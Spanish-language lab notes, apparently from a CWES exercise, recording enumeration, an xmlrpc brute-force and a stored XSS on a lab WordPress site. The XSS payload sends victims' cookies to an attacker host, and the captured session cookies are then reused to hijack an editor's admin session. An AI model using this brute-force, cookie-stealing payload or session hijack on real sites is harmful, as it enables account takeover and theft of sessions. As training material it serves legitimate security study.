[[CWES]] [[Web Enumeración]] [[Web Explotación]] [[CWES - Checklist]]

## ip y hosts

IP: 
```
10.129.247.239
```

Agregue al /etc/hosts: 
```
10.129.247.239    trilocor.local www.trilocor.local
```

Hice un escaneo de hosts:
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.trilocor.local" -u http://10.129.247.239/ -fw 5194 -t 100
```
y encontré: `admin` el cual agregué también al /etc/hosts: 
```
10.129.247.239    trilocor.local www.trilocor.local admin.trilocor.local
```

## servidor

El servidor es: 
```
curl -Iv http://www.trilocor.local/

Apache/2.4.41 (Ubuntu)
```

## CMS 

Me encuentro con un wordpress 6.0.2 y astra 3.9.2

### robots.txt

También encuentro esto en `robots.txt`: 
```
http://admin.trilocor.local/robots.txt

User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://www.trilocor.local/wp-sitemap.xml

# y para el caso del admin:
Sitemap: http://admin.trilocor.local/wp-sitemap.xml
```

### plugins y temas

Extraigo los plugins y temas: 
```
curl -s http://www.trilocor.local/ | grep plugin

curl -s http://www.trilocor.local/ | grep themes
```
encuentro:
- **Plugin:** Elementor Website Builder
- **Versión detectada:** **3.7.7**
    - _Nota:_ Esta versión se confirma tanto en los parámetros de los scripts (`?ver=3.7.7`) como en el objeto de configuración de Javascript (`"version":"3.7.7"`).
Dentro de las carpetas de Elementor, también se cargan los siguientes componentes y librerías externas con sus respectivas versiones (controladas por el propio plugin o por WordPress):
- **Elementor Icons (eicons):** Versión **5.16.0** (`?ver=5.16.0`)
- **Font Awesome (Iconos):** Versión **5.15.3** (`?ver=5.15.3`)
- **Waypoints (Librería de scroll):** Versión **4.0.2** (`?ver=4.0.2`)

### wpscan
wpscan encontró: 
```
sudo wpscan --url http://www.trilocor.local/ --enumerate --api-token [REDACTED]
y
sudo wpscan --url http://admin.trilocor.local/ --enumerate --api-token [REDACTED]
```

[[resultado wpscan]]

### usuarios

Encuentro esta lista de usuarios: 
```
web-admin
web-editor
hr-smith
r.batty
pr-martins
trilocor.Emerald
trilocor.Shiv
trilocor.Gradin
trilocor.Vagient
trilocor.Fankle
```

### fuerza bruta

Les hago fuerza bruta con wp-scan: 
```
wpscan --password-attack xmlrpc -t 20 -U users-wp.txt -P /usr/share/wordlists/rockyou.txt --url http://admin.trilocor.local/ --api-token [REDACTED]
```

### api 

http://www.trilocor.local/index.php/wp-json/
y
http://www.trilocor.local/index.php/wp-json/wp/v2/

## Stored XSS

**Paso 1 — Leer el contenido real del sitio.**
En la home hay una sección "Leave your testimonial". Su código fuente revela el endpoint. Se obtiene de dos formas equivalentes:
- _Desde el navegador:_ entre a `http://www.trilocor.local/`, fui a la sección de testimonios, click derecho → "Ver código fuente" y buscque el formulario.
- _Desde la API REST_ (que devuelve el contenido de la home en crudo):
```bash
curl -s 'http://www.trilocor.local/index.php/wp-json/wp/v2/posts' | grep -i 'action='
```
En ambos casos aparece este formulario:
```html
<form id="contact" action="/wp-content/plugins/secure_testimonials/post-testimonial.php" method="post">
```
Ese atributo action="..." es de donde sale la ruta. Ahí aparece el nombre del plugin (secure_testimonials) y su endpoint (post-testimonial.php). El method="post" confirma que hay que enviarlo por POST.

**Paso 2 — Confirmar que el endpoint procesa el envío.** Replicando el POST con curl (lo que el navegador hace al apretar "Submit"):
```
curl -i -X POST 'http://www.trilocor.local/wp-content/plugins/secure_testimonials/post-testimonial.php' \
  --data 'name=test&company_title=test&email=test@test.com&testimonial=hola'
```
Respuesta: `HTTP 200` con "Thank you! Your testimonial has been received successfully." → el endpoint guarda lo que se manda.

**Paso 3 — Detecto que no sanitiza el input.** Se reenvía con etiquetas HTML de prueba y las acepta sin filtrarlas:
```
curl -X POST 'http://www.trilocor.local/wp-content/plugins/secure_testimonials/post-testimonial.php' \
  --data 'name=test&company_title=test&email=a@a.com&testimonial=<u>x</u>'
```
Como no rechaza el HTML, también va a aceptar `<script>` → posible Stored XSS.

**Paso 4 — Monto el receptor.** En la máquina de ataque:
```
python3 -m http.server 80
```

**Paso 5 — Inyecto el payload.** Se envía un testimonial cuyo contenido es un script que roba la cookie:
```
curl -X POST 'http://www.trilocor.local/wp-content/plugins/secure_testimonials/post-testimonial.php' \
  --data-urlencode 'name=Cliente' \
  --data-urlencode 'company_title=ACME' \
  --data-urlencode 'email=a@a.com' \
  --data-urlencode 'testimonial=<script>new Image().src="http://10.10.14.22/hook?c="+document.cookie</script>'
```

**Paso 6 — Capturo la cookie.** Cuando el revisor (`web-editor`) abre el testimonial, su navegador ejecuta el script y el listener recibe:
```
GET /hook?c=wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1782146326%7Co8ojVl6YFXdQDhkTqC34RCUTxZnZN5xzlLwUUBnNnCr%7Ca5dca2a886099d561ecddfd166c764e342f1eb1d15a87a0ec52fb09f6a562b57;%20wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1782146326%7Co8ojVl6YFXdQDhkTqC34RCUTxZnZN5xzlLwUUBnNnCr%7Cce6e051f7354cccc2d71004f07a84944e8f65b0219df49d6868dbd04462463e4;%20wordpress_test_cookie=WP%20Cookie%20check HTTP/1.1" 404 -
```
Las cookies no tenían `HttpOnly`, por eso `document.cookie` pudo leerlas.

**Paso 7 — Secuestrar la sesión.** Cargo esas cookies (decodificando `%7C` → `|`) en el navegador con Cookie-Editor sobre `admin.trilocor.local`, y al entrar a `/wp-admin/` WordPress reconoce la sesión como `web-editor` sin pedir contraseña.
Abrí Cookie-Editor y creé dos cookies nuevas, una por cada una:
- Nombre: `wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9` → Valor: `web-editor|1782144468|7XpTu09NZe1UJuzI94TtiASxkRuxxlMuFXaOhvD81Ul|0fdf700a49698a0b069a57498190bc8e2e24330b62d2ffa335171acc79196817`
- Nombre: `wordpress_828ff7d64a441f8aab6a0310bdcee6a9` → Valor: `web-editor|1782144468|7XpTu09NZe1UJuzI94TtiASxkRuxxlMuFXaOhvD81Ul|3d54c85847ebb860dfb379cf8b55d0df6e650a57b24ebc1adcbc23912fd627e2`